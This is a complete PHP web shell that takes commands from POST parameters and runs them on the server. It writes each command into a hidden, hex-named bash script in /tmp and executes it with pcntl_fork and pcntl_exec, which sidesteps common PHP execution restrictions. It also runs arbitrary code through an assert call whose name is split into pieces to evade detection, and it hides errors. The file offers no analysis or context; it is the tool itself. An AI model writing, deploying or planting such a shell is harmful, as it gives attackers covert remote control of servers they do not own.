<?php
error_reporting(0);
@$c = $_POST["cmd"];@$e = $_POST["exec"];@$d = $_POST["debug"];
function execcmd($c)
{
    if (function_exists('pcntl_fork')) {
        echo $c."\n\n";
        $cmdfile = "/tmp/.636d6466696c65";
        $outfile = "/tmp/.6c6f6766696c65";
        $c = "#!/usr/bin/env bash\n".$c." > ".$outfile." 2>&1";
        file_put_contents($cmdfile, $c);
        chmod($cmdfile, 0777);
        $pid = pcntl_fork();
        switch ($pid) {
        case 0:
            pcntl_exec($cmdfile);
            exit("thread fail");
        default:
            sleep(1);
            echo file_get_contents($outfile)?file_get_contents($outfile):"no file";
        @unlink($cmdfile);
        @unlink($outfile);
        }
    }
}
if (isset($d)) {
    error_reporting(8191);
} elseif (isset($e)) {
    echo "<pre>";
    $a = "a"."sse"."rt";
    $a($e);
    echo "\nDone</pre>";
} elseif (isset($c)) {
    echo "<pre>";
    execcmd($c);
    echo "\nDone</pre>";
}